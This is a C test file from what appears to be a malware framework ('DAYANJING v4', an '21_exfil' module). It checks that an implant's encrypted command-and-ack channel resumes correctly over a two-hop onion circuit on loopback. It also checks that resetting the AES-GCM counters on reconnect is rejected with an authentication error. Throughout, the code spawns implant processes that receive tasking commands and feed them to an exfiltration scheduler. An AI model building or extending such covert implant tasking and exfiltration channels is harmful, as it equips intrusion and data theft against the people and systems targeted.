/*
 * DAYANJING v4 — 21_exfil/tests/test_task_resume.c
 *
 * 重连恢复接进**真实洋葱电路**（限制3）。
 *
 * ====================================================================
 * 被解除的限制
 * ====================================================================
 * 此前会话恢复只在单跳内存里验证过，没有跑过真实洋葱电路。
 * 本测试补齐：断开 -> 重建电路 -> 用保存的恢复点续用会话。
 *
 * ====================================================================
 * 恢复必须带走计数器的反证（本测试最关键的一条）
 * ====================================================================
 * 信元层 IV = pfx || counter，两端各自计数；同一会话派生出的 pfx 不变。
 * 若重连后 counter 归零，就会复用断线前已用过的 IV —— GCM 致命误用。
 *
 * 本测试用一条**负向用例**把这个性质钉死：
 *     接收端从 N 恢复（期望 IV counter = N）
 *     发送端"天真地"从 0 重启（实际发出 IV counter = 0）
 *     => 必须 AUTH 失败，绝不能"碰巧通过"
 *
 * 若这条用例哪天变成 PASS，说明有人在恢复路径上把计数清零了 ——
 * 那正是把 GCM 变成可异或泄露明文的状态。
 */

#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "crypto_x25519.h"

#include "p2p.h"
#include "p2p_onion.h"
#include "p2p_cell.h"
#include "exfil_task.h"
#include "exfil_task_link.h"
#include "exfil_sched.h"

static int pass = 0, fail = 0;

#define CK(cond, name) do {                             \
    if (cond) { printf("[PASS] %s\n", name); pass++; }  \
    else      { printf("[FAIL] %s\n", name); fail++; }  \
} while (0)

static const uint8_t K_A[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
static const uint8_t K_B[16] = { 16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1 };
static const uint8_t PFX[8]  = { 0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8 };

typedef struct {
    int      rc;
    uint64_t seq;
    uint32_t opcode;
    uint32_t status;
    uint64_t task_id;
} impl_res_t;

static void set_id(uint8_t *id, const char *s) {
    memset(id, 0, P2P_NODE_ID_LEN);
    memcpy(id, s, strlen(s) > P2P_NODE_ID_LEN ? P2P_NODE_ID_LEN : strlen(s));
}

static int listen_auto(int *out_port) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    int on = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof on);
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = 0;
    if (bind(s, (struct sockaddr *)&a, sizeof a) < 0) { close(s); return -1; }
    if (listen(s, 8) < 0) { close(s); return -1; }
    struct sockaddr_in got; socklen_t gl = sizeof got;
    if (getsockname(s, (struct sockaddr *)&got, &gl) < 0) { close(s); return -1; }
    *out_port = ntohs(got.sin_port);
    return s;
}

static pid_t spawn_onion_node(const p2p_mesh_t *m, const uint8_t *my_id,
                              const uint8_t sk[P2P_ONION_SK_LEN], int *port) {
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);
        close(pfd[1]);
        p2p_onion_route_serve(m, my_id, sk, s);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    close(pfd[0]);
    *port = lp;
    return pid;
}

/*
 * 植入体进程。resumed=0 走全新 init；resumed=1 走 exfil_task_chan_resume，
 * 用调用方给的恢复点续用计数器 —— 模拟"同一 implant 断线重连"。
 */
static pid_t spawn_implant(int *port, int rpfd, int n_cmds, int resumed,
                           uint32_t send_ctr, uint32_t recv_ctr,
                           uint64_t lsd, uint64_t lsu) {
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);

        int cfd = accept(s, NULL, NULL);
        if (cfd < 0) _exit(4);

        exfil_task_chan_t ch;
        /* 植入体侧：ks=K_B, kr=K_A（与服务端互补） */
        if (resumed) {
            if (exfil_task_chan_resume(&ch, K_B, K_A, PFX,
                                       send_ctr, recv_ctr, lsd, lsu)
                != EXF_TASK_OK) _exit(5);
        } else {
            if (exfil_task_chan_init(&ch, K_B, K_A, PFX) != EXF_TASK_OK) _exit(5);
        }

        exfil_sched_t sch;
        if (exfil_sched_init(&sch, NULL, 0x1234abcd5678ef01ULL) != EXF_SCHED_OK)
            _exit(6);

        for (int i = 0; i < n_cmds; i++) {
            exfil_task_cmd_t cmd;
            uint64_t seq = 0;
            memset(&cmd, 0, sizeof cmd);

            int rc = exfil_task_chan_recv_cmd(&ch, cfd, &seq, &cmd);

            impl_res_t res;
            memset(&res, 0, sizeof res);
            res.rc = rc; res.seq = seq;

            if (rc == EXF_TASK_OK) {
                int ar = exfil_task_apply(&sch, &cmd);
                uint8_t st = (ar == EXF_TASK_OK)      ? EXF_TASK_ST_OK
                           : (ar == EXF_TASK_ERR_CFG) ? EXF_TASK_ST_BAD_CFG
                           :                            EXF_TASK_ST_UNKNOWN;
                exfil_task_ack_t ack;
                memset(&ack, 0, sizeof ack);
                if (exfil_task_fill_ack(&sch, &cmd, st, &ack) != EXF_TASK_OK)
                    _exit(7);
                res.opcode = cmd.opcode; res.status = st; res.task_id = cmd.task_id;
                if (exfil_task_chan_ack(&ch, cfd, seq, &ack) != EXF_TASK_OK)
                    _exit(8);
            }
            if (write(pfd[1], &res, sizeof res) != (ssize_t)sizeof res) break;
        }
        exfil_sched_wipe(&sch);
        exfil_task_chan_wipe(&ch);
        close(cfd); close(s); close(pfd[1]);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    dup2(pfd[0], rpfd);
    close(pfd[0]);
    *port = lp;
    return pid;
}

static int read_res(int rpfd, impl_res_t *out) {
    return read(rpfd, out, sizeof *out) == (ssize_t)sizeof *out ? 0 : -1;
}

static void mk_cmd(exfil_task_cmd_t *c, uint8_t op, uint64_t tid) {
    memset(c, 0, sizeof *c);
    c->opcode = op;
    c->task_id = tid;
}

/* ================================================================== */
/* Part A：真实洋葱电路上的重连恢复                                     */
/* ================================================================== */
static void t_resume_over_onion(void) {
    uint8_t ID_SV[P2P_NODE_ID_LEN], ID_E0[P2P_NODE_ID_LEN], ID_CORE[P2P_NODE_ID_LEN];
    set_id(ID_SV, "SERVER"); set_id(ID_E0, "EDGE0"); set_id(ID_CORE, "CORE");

    uint8_t sk_e0[32], pk_e0[32], sk_core[32], pk_core[32];
    CK(x25519_generate_keypair(sk_e0, pk_e0) == X25519_OK, "edge0 生成静态密钥对");
    CK(x25519_generate_keypair(sk_core, pk_core) == X25519_OK, "core 生成静态密钥对");

    p2p_mesh_t m_core; p2p_mesh_init(&m_core);
    p2p_node_add(&m_core, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", 0);
    int p_core = 0;
    pid_t pid_core = spawn_onion_node(&m_core, ID_CORE, sk_core, &p_core);
    CK(pid_core > 0 && p_core > 0, "core 节点启动");

    p2p_mesh_t m_e0; p2p_mesh_init(&m_e0);
    p2p_node_add(&m_e0, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", 0);
    p2p_node_add(&m_e0, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_neighbor_link(&m_e0, ID_E0, ID_CORE);
    int p_e0 = 0;
    pid_t pid_e0 = spawn_onion_node(&m_e0, ID_E0, sk_e0, &p_e0);
    CK(pid_e0 > 0 && p_e0 > 0, "edge0 节点启动");

    p2p_mesh_t m_sv; p2p_mesh_init(&m_sv);
    p2p_node_add(&m_sv, ID_SV, P2P_ROLE_ENDPOINT, "server", "127.0.0.1", 0);
    p2p_node_add(&m_sv, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", (uint16_t)p_e0);
    p2p_node_add(&m_sv, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_node_set_pub(&m_sv, ID_E0, pk_e0);
    p2p_node_set_pub(&m_sv, ID_CORE, pk_core);
    p2p_neighbor_link(&m_sv, ID_SV, ID_E0);
    p2p_neighbor_link(&m_sv, ID_E0, ID_CORE);

    uint8_t salt[P2P_ONION_SALT_LEN];
    for (int i = 0; i < P2P_ONION_SALT_LEN; i++) salt[i] = (uint8_t)(i + 0x40);

    /* ---- 第一段会话：3 条命令 ---- */
    int rp = dup(0);
    int ip = 0, fd = -1;
    pid_t pid_i1 = spawn_implant(&ip, rp, 3, 0, 0, 0, 0, 0);
    CK(pid_i1 > 0 && ip > 0, "植入体进程启动（首次连接）");

    exfil_task_chan_t sv;
    CK(exfil_task_chan_init(&sv, K_A, K_B, PFX) == EXF_TASK_OK, "服务端通道初始化");

    int rc = p2p_onion_route_open(&m_sv, ID_SV, ID_CORE,
                                  "127.0.0.1", (uint16_t)ip, salt, &fd);
    CK(rc == P2P_OK && fd >= 0, "洋葱电路建立（2 跳）");
    if (fd < 0) return;

    for (int i = 0; i < 3; i++) {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_START, 2000 + (uint64_t)i);
        CK(exfil_task_chan_cmd(&sv, fd, (uint64_t)(i + 1), &c) == EXF_TASK_OK,
           "首次会话 命令写入电路");
        impl_res_t r;
        CK(read_res(rp, &r) == 0, "首次会话 读到植入体报告");
        CK(r.rc == EXF_TASK_OK, "首次会话 命令被接受");
        exfil_task_ack_t a;
        CK(exfil_task_chan_recv_ack(&sv, fd, NULL, &a) == EXF_TASK_OK,
           "首次会话 回执经电路返回");
    }

    /* ---- 断点：导出恢复点 ---- */
    uint32_t s_ctr = 0, r_ctr = 0;
    uint64_t lsd = 0, lsu = 0;
    exfil_task_chan_checkpoint(&sv, &s_ctr, &r_ctr, &lsd, &lsu);
    printf("      恢复点: send=%u recv=%u seq_down=%llu seq_up=%llu\n",
           s_ctr, r_ctr, (unsigned long long)lsd, (unsigned long long)lsu);
    CK(s_ctr >= 3, "断点：发送计数已推进（>=3，含命令）");
    CK(r_ctr >= 3, "断点：接收计数已推进（>=3，含回执）");

    /* ---- 断线：关闭电路，等植入体退出 ---- */
    close(fd);
    int st = 0;
    waitpid(pid_i1, &st, 0);

    /* ---- 第二段会话：重连 + 恢复 ---- */
    int rp2 = dup(0);
    int ip2 = 0, fd2 = -1;
    /*
     * 恢复点的**方向是相对的**，两端必须互换：
     *   服务端的 send_ctr（已发命令数） == 植入体的 recv_ctr（已收命令数）
     *   服务端的 recv_ctr（已收回执数） == 植入体的 send_ctr（已发回执数）
     * 直接把服务端断点原样喂给植入体会让两把计数错位一个方向，
     * 表现为 IV 对不上 —— 这正是"互补持有密钥"最容易写错的地方。
     */
    uint64_t next_seq = 4;   /* 首次会话已用 seq 1..3 */
    pid_t pid_i2 = spawn_implant(&ip2, rp2, 2, 1,
                                 r_ctr, s_ctr,      /* send/recv 互换 */
                                 next_seq - 1, lsu); /* 已收最大下行 seq = 3 */
    CK(pid_i2 > 0 && ip2 > 0, "植入体进程启动（重连，走 resume）");

    exfil_task_chan_t sv2;
    CK(exfil_task_chan_resume(&sv2, K_A, K_B, PFX, s_ctr, r_ctr, lsd, lsu)
       == EXF_TASK_OK, "服务端通道按恢复点重建");

    int rc2 = p2p_onion_route_open(&m_sv, ID_SV, ID_CORE,
                                   "127.0.0.1", (uint16_t)ip2, salt, &fd2);
    CK(rc2 == P2P_OK && fd2 >= 0, "重建洋葱电路（2 跳）");
    if (fd2 < 0) return;

    for (int i = 0; i < 2; i++) {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_START, 2100 + (uint64_t)i);
        CK(exfil_task_chan_cmd(&sv2, fd2, next_seq + (uint64_t)i, &c) == EXF_TASK_OK,
           "恢复会话 命令写入电路");
        impl_res_t r;
        CK(read_res(rp2, &r) == 0, "恢复会话 读到植入体报告");
        CK(r.rc == EXF_TASK_OK, "恢复会话 命令被接受（计数器续用成功）");
        CK(r.task_id == 2100 + (uint64_t)i, "恢复会话 task_id 一致");
        exfil_task_ack_t a;
        CK(exfil_task_chan_recv_ack(&sv2, fd2, NULL, &a) == EXF_TASK_OK,
           "恢复会话 回执经电路返回");
        CK(a.status == EXF_TASK_ST_OK, "恢复会话 回执状态 OK");
    }

    close(fd2);
    waitpid(pid_i2, &st, 0);
    kill(pid_e0, SIGTERM); kill(pid_core, SIGTERM);
    waitpid(pid_e0, NULL, 0); waitpid(pid_core, NULL, 0);
}

/* ================================================================== */
/* Part B：计数器延续的反证（恢复时归零 => IV 重用 => AUTH）           */
/* ================================================================== */
static void t_counter_must_continue(void) {
    int sp[2];
    CK(socketpair(AF_UNIX, SOCK_STREAM, 0, sp) == 0, "建立 socketpair");

    exfil_sched_t sch_b;
    CK(exfil_sched_init(&sch_b, NULL, 0x1234abcd5678ef01ULL) == EXF_SCHED_OK,
       "Part B 调度器初始化");

    exfil_task_chan_t sv, im;
    CK(exfil_task_chan_init(&sv, K_A, K_B, PFX) == EXF_TASK_OK, "sv 初始化");
    CK(exfil_task_chan_init(&im, K_B, K_A, PFX) == EXF_TASK_OK, "im 初始化");

    /* 先跑 5 轮，让两端计数推进到 5 */
    for (int i = 0; i < 5; i++) {
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_START, 3000 + (uint64_t)i);
        if (exfil_task_chan_cmd(&sv, sp[0], (uint64_t)(i + 1), &c) != EXF_TASK_OK) {
            CK(0, "预跑命令发送");
            break;
        }
        exfil_task_cmd_t got; uint64_t s = 0;
        if (exfil_task_chan_recv_cmd(&im, sp[1], &s, &got) != EXF_TASK_OK) {
            CK(0, "预跑命令接收");
            break;
        }
        /* 回执必须走 fill_ack 构造：手工填字段会缺 magic/ver，
         * 编码后解不开 —— 之前的失败就是这么来的。 */
        exfil_task_ack_t a;
        memset(&a, 0, sizeof a);
        if (exfil_task_fill_ack(&sch_b, &got, EXF_TASK_ST_OK, &a) != EXF_TASK_OK) {
            CK(0, "预跑回执构造"); break;
        }
        if (exfil_task_chan_ack(&im, sp[1], s, &a) != EXF_TASK_OK) { CK(0, "预跑回执"); break; }
        exfil_task_ack_t ra;
        if (exfil_task_chan_recv_ack(&sv, sp[0], NULL, &ra) != EXF_TASK_OK) { CK(0, "预跑回执接收"); break; }
    }

    uint32_t s_ctr = 0, r_ctr = 0, i_s = 0, i_r = 0;
    uint64_t lsd = 0, lsu = 0, i_lsd = 0, i_lsu = 0;
    exfil_task_chan_checkpoint(&sv, &s_ctr, &r_ctr, &lsd, &lsu);
    exfil_task_chan_checkpoint(&im, &i_s, &i_r, &i_lsd, &i_lsu);
    printf("      sv 断点 send=%u recv=%u ; im 断点 send=%u recv=%u\n",
           s_ctr, r_ctr, i_s, i_r);
    CK(s_ctr == 5 && r_ctr == 5, "预跑后 sv 收发计数均为 5");
    CK(i_r == 5 && i_s == 5, "预跑后 im 收发计数均为 5");

    /* ---- 正例：两端都按恢复点续用 ---- */
    {
        exfil_task_chan_t sv_r, im_r;
        CK(exfil_task_chan_resume(&sv_r, K_A, K_B, PFX, s_ctr, r_ctr, lsd, lsu)
           == EXF_TASK_OK, "sv 按恢复点重建");
        CK(exfil_task_chan_resume(&im_r, K_B, K_A, PFX, i_s, i_r, i_lsd, i_lsu)
           == EXF_TASK_OK, "im 按恢复点重建");

        /*
         * 命令 seq 必须大于**接收端**已接受的最大下行 seq（i_lsd），
         * 不是服务端自己的 lsd —— 服务端 lsd 记的是"收到的命令"，
         * 而这里服务端是发送方，它的 lsd 一直是 0。
         */
        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_START, 4001);
        CK(exfil_task_chan_cmd(&sv_r, sp[0], i_lsd + 1, &c) == EXF_TASK_OK,
           "恢复后命令发出");
        exfil_task_cmd_t got; uint64_t s = 0;
        int rc = exfil_task_chan_recv_cmd(&im_r, sp[1], &s, &got);
        CK(rc == EXF_TASK_OK, "恢复后命令被接受（两端计数一致）");
        if (rc != EXF_TASK_OK) printf("      rc=%d\n", rc);
    }

    /* ---- 反例：接收端从 5 恢复，发送端天真归零 => 必须 AUTH ---- */
    {
        exfil_task_chan_t sv_naive, im_r2;
        CK(exfil_task_chan_init(&sv_naive, K_A, K_B, PFX) == EXF_TASK_OK,
           "sv 天真重建（计数归零）");
        CK(exfil_task_chan_resume(&im_r2, K_B, K_A, PFX, i_s, i_r, i_lsd, i_lsu)
           == EXF_TASK_OK, "im 从 5 恢复");

        exfil_task_cmd_t c; mk_cmd(&c, EXF_TASK_OP_START, 4002);
        int wrc = exfil_task_chan_cmd(&sv_naive, sp[0], 1, &c);
        CK(wrc == EXF_TASK_OK, "天真端命令已写入（发送侧无异常）");

        exfil_task_cmd_t got; uint64_t s = 0;
        int rc = exfil_task_chan_recv_cmd(&im_r2, sp[1], &s, &got);
        printf("      天真归零后接收端 rc=%d\n", rc);
        CK(rc != EXF_TASK_OK, "计数归零被拒（IV 对不上，绝不能碰巧通过）");
        CK(rc == EXF_TASK_ERR_AUTH,
           "失败码恰为 EXF_TASK_ERR_AUTH(-6)（AEAD 验签失败，不是别的）");
    }

    exfil_sched_wipe(&sch_b);
    close(sp[0]); close(sp[1]);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== test_task_resume ===\n");
    signal(SIGPIPE, SIG_IGN);
    t_counter_must_continue();
    t_resume_over_onion();
    printf("=== result: %d pass, %d fail ===\n", pass, fail);
    return fail ? 1 : 0;
}
